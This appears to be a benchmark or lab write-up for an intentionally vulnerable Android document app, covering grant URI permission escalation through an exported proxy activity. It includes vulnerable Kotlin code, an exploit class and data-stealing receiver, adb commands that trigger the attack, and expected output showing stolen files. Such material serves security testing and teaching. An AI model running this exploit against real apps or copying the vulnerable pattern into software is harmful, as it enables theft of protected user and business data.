# oxo-android-ben52: Grant URI Permission Escalation via Proxy Activity

## Vulnerability Overview

Grant URI Permission Escalation via Proxy Activity occurs when Android applications contain exported proxy activities that process embedded Intent objects containing URI permission grant flags and forward them without proper validation. Attackers can exploit this pattern to bypass content provider export restrictions by forcing the vulnerable app to grant persistent URI permissions to protected, non-exported content providers.

## Attack Vector: Content Provider URI Permission Escalation

**Brief Explanation**: An exported proxy activity that processes embedded Intent objects with URI permission flags can be exploited to gain unauthorized access to non-exported content providers. The proxy activity receives embedded intents containing FLAG_GRANT_*_URI_PERMISSION flags and forwards them using `startActivity()` or `grantUriPermission()`, effectively bypassing content provider export restrictions and enabling persistent access to sensitive data.

**Key Characteristics:**
- Exported proxy activity that processes workflow intent JSON
- Non-exported content provider with grantUriPermissions="true"
- URI permission flags processed without validation
- Complete bypass of content provider export restrictions
- Persistent access to protected business documents and sensitive data

**Vulnerable Code Pattern:**
```kotlin
// VULNERABLE: Exported proxy activity that processes workflow intents
class IntentProcessorActivity : Activity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        handleIncomingIntent(intent)
        finish()
    }
    
    private fun handleIncomingIntent(intent: Intent) {
        when {
            intent.hasExtra("workflow_intent") -> {
                // VULNERABLE: Processes workflow intents with URI permission grants
                handleWorkflowIntent(intent)
            }
            else -> {
                Log.d("DocumentProcessor", "Unknown intent action")
            }
        }
    }
    
    private fun handleWorkflowIntent(intentJson: String) {
        try {
            val jsonObject = JSONObject(intentJson)
            val workflowIntent = Intent().apply {
                action = jsonObject.optString("action", Intent.ACTION_VIEW)
                data = Uri.parse(jsonObject.getString("data"))
                
                // CRITICAL VULNERABILITY: URI permission flags processed without validation
                if (jsonObject.has("flags")) {
                    val flagsArray = jsonObject.getJSONArray("flags")
                    for (i in 0 until flagsArray.length()) {
                        when (flagsArray.getString(i)) {
                            "FLAG_GRANT_READ_URI_PERMISSION" -> {
                                addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
                            }
                            "FLAG_GRANT_WRITE_URI_PERMISSION" -> {
                                addFlags(Intent.FLAG_GRANT_WRITE_URI_PERMISSION)
                            }
                            "FLAG_GRANT_PERSISTABLE_URI_PERMISSION" -> {
                                addFlags(Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION)
                            }
                        }
                    }
                }
            }
            
            // DANGEROUS: Execute workflow intent with URI permission grants
            startActivity(workflowIntent)
        } catch (e: Exception) {
            // Fallback: Try to grant permissions directly to calling package
            if (workflowIntent.data != null) {
                grantUriPermission(
                    callingActivity?.packageName,
                    workflowIntent.data!!,
                    Intent.FLAG_GRANT_READ_URI_PERMISSION or Intent.FLAG_GRANT_WRITE_URI_PERMISSION
                )
            }
        }
    }
}

// VULNERABLE: Non-exported provider with grant permissions enabled
<provider
    android:name=".providers.DocumentContentProvider"
    android:authorities="com.documentmanager.secure"
    android:exported="false"
    android:grantUriPermissions="true" />
```

**Malicious Exploit Code:**
```kotlin
// MALICIOUS: Exploit to gain URI permissions via proxy activity
class GrantUriExploit {
    fun exploitProxyActivity(context: Context) {
        // Create malicious workflow intent with URI permission flags
        val exploitPayload = JSONObject().apply {
            put("action", "android.intent.action.VIEW")
            put("data", "content://com.documentmanager.secure/documents")
            put("flags", JSONArray().apply {
                put("FLAG_GRANT_READ_URI_PERMISSION")
                put("FLAG_GRANT_WRITE_URI_PERMISSION")
                put("FLAG_GRANT_PREFIX_URI_PERMISSION")
                put("FLAG_GRANT_PERSISTABLE_URI_PERMISSION")
            })
            put("component", "com.attacker.malicious/.DataReceiver")
        }
        
        // Launch attack via IntentProcessorActivity
        val attackIntent = Intent().apply {
            setClassName("com.documentmanager", "com.documentmanager.IntentProcessorActivity")
            putExtra("workflow_intent", exploitPayload.toString())
        }
        
        context.startActivity(attackIntent)
    }
}

// MALICIOUS: Receiver that gets URI permissions and steals sensitive data
class DataReceiver : Activity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Access protected content provider with granted permissions
        stealSensitiveDocuments()
        finish()
    }
    
    private fun stealSensitiveDocuments() {
        try {
            val documentsUri = Uri.parse("content://com.documentmanager.secure/documents")
            contentResolver.query(documentsUri, null, null, null, null)?.use { cursor ->
                while (cursor.moveToNext()) {
                    val filename = cursor.getString(cursor.getColumnIndex("filename"))
                    val sensitiveData = cursor.getString(cursor.getColumnIndex("sensitive_data"))
                    Log.d("STOLEN_DOCUMENT", "File: $filename")
                    Log.d("STOLEN_DATA", "Content: $sensitiveData")
                    
                    // Send stolen business data to attacker server
                    sendToServer(filename, sensitiveData)
                }
            }
            
            val usersUri = Uri.parse("content://com.documentmanager.secure/users")
            contentResolver.query(usersUri, null, null, null, null)?.use { cursor ->
                while (cursor.moveToNext()) {
                    val authData = cursor.getString(cursor.getColumnIndex("sensitive_data"))
                    Log.d("STOLEN_AUTH", "Authentication data: $authData")
                    sendToServer("auth_data", authData)
                }
            }
        } catch (e: Exception) {
            Log.e("EXPLOIT_ERROR", "Failed to steal data", e)
        }
    }
    
    private fun sendToServer(filename: String, content: String) {
        // Simulate sending to attacker server
        Log.d("DATA_EXFILTRATED", "Sending $filename to evil server")
    }
}
```
## Testing

```bash
# Install the vulnerable DocumentManager Pro app with URI permission escalation
adb install -r oxo-android-ben52.apk

# Launch DocumentManager Pro to initialize sensitive data
adb shell am start -n com.documentmanager/.MainActivity

# Test direct access to non-exported provider (should fail)
adb shell content query --uri content://com.documentmanager.secure/documents
adb shell content query --uri content://com.documentmanager.secure/users
adb shell content query --uri content://com.documentmanager.secure/sessions

# Test URI permission escalation exploitation via ADB
adb shell am start \
  -n com.documentmanager/.IntentProcessorActivity \
  --es workflow_intent '{"action":"android.intent.action.VIEW","data":"content://com.documentmanager.secure/documents","flags":["FLAG_GRANT_READ_URI_PERMISSION","FLAG_GRANT_WRITE_URI_PERMISSION"]}'

# Monitor for URI permission grants and data access in logs
adb logcat -s DocumentProcessor:D DocumentProvider:D

# Verify proxy activity is exported and accessible
adb shell dumpsys package com.documentmanager | grep -A 5 "IntentProcessorActivity"

# Check content provider configuration
adb shell dumpsys package com.documentmanager | grep -A 10 "DocumentContentProvider"

# Verify sensitive files exist in app directory
adb shell "run-as com.documentmanager ls -la /data/data/com.documentmanager/files/secure/"

# View actual sensitive document data
adb shell "run-as com.documentmanager head -5 /data/data/com.documentmanager/files/secure/Financial_Report_Q4_2024.pdf"

# Run the exploit script
python3 exploit/uri_exploit.py
```

**Expected Results:**
```
Direct Provider Access (Blocked):
Error while accessing provider:com.documentmanager.secure
java.lang.SecurityException: Permission Denial: opening provider com.documentmanager.providers.DocumentContentProvider 
from (null) (pid=12345, uid=2000) that is not exported from UID 10116

URI Permission Escalation (Success):
DocumentProcessor: Processing workflow intent JSON
DocumentProcessor: ⚠️ Adding READ URI permission grant
DocumentProcessor: ⚠️ Adding WRITE URI permission grant
DocumentProcessor: ✅ Workflow intent executed - URI permissions granted
STOLEN_DOCUMENT: File: Financial_Report_Q4_2024.pdf
STOLEN_DATA: Content: Revenue: $4.25M, Profit: $1.15M, Bank: 789-456-123-001
STOLEN_DOCUMENT: File: Employee_Database.xlsx  
STOLEN_DATA: Content: 125 employees, SSNs included, salary data, security clearances
DATA_EXFILTRATED: Sending Financial_Report_Q4_2024.pdf to evil server

Sensitive Data Exposed:
total 32
-rw------- 1 u0_a116 u0_a116  568 Business_Strategy_2025.pptx
-rw------- 1 u0_a116 u0_a116  624 Client_Contracts.docx
-rw------- 1 u0_a116 u0_a116  581 Employee_Database.xlsx
-rw------- 1 u0_a116 u0_a116  483 Financial_Report_Q4_2024.pdf

Sample Content:
CONFIDENTIAL - FINANCIAL REPORT Q4 2024
========================================
Total Revenue: $4,250,000
Net Profit: $1,150,000
Operating Expenses: $3,100,000

Exploit Test Output:
[+] Direct provider access blocked (expected)
[+] Proxy activity accessible and processing workflow intents
[+] URI permission grant successful via workflow intent processing
[!] VULNERABILITY CONFIRMED: Non-exported provider accessible via URI grants
[+] Sensitive data extracted: financial reports, employee records, client contracts
[+] Persistent access maintained via FLAG_GRANT_PERSISTABLE_URI_PERMISSION
```

**Difficulty**: Medium

## Impact Assessment

- **Confidentiality**: Critical - Complete bypass of export restrictions enabling access to protected content providers and sensitive business data
- **Integrity**: High - URI permission grants can include write access for data modification and corruption
- **Availability**: Medium - Potential for DoS through content provider resource exhaustion
- **OWASP Mobile Top 10**: M1 - Improper Platform Usage, M6 - Insecure Authorization, M10 - Extraneous Functionality
- **CWE**: CWE-926 (Improper Export of Android Application Components), CWE-863 (Incorrect Authorization), CWE-284 (Improper Access Control)

## Grant URI Permission Attack Scenarios

1. **Content Provider Access**: Bypass export restrictions to access non-exported content providers with sensitive data
2. **Business Data Theft**: Extract financial reports, employee records, and confidential business documents
3. **Authentication Bypass**: Access protected authentication data, session tokens, and password hashes
4. **Persistent Access**: Maintain long-term access through persistent URI permission grants
5. **Enterprise Espionage**: Leverage victim app's permissions to access business-critical information

**Example Attack Flow:**
```bash
# 1. Target app has exported proxy activity that processes workflow intents
# 2. App has non-exported content provider with grantUriPermissions="true"
# 3. Attacker crafts malicious JSON with URI permission grant flags
# 4. Proxy activity processes workflow intent and forwards permission flags
# 5. Android system grants URI permissions to attacker's component
# 6. Attacker gains persistent access to protected content provider
# 7. Sensitive business data extracted via content queries
# 8. Complete bypass of export restrictions and access controls
```

This vulnerability demonstrates how proxy activity patterns can completely defeat Android's export restrictions for content providers, highlighting the danger of processing untrusted workflow intents with URI permission flags and the need for proper intent validation before granting URI permissions.
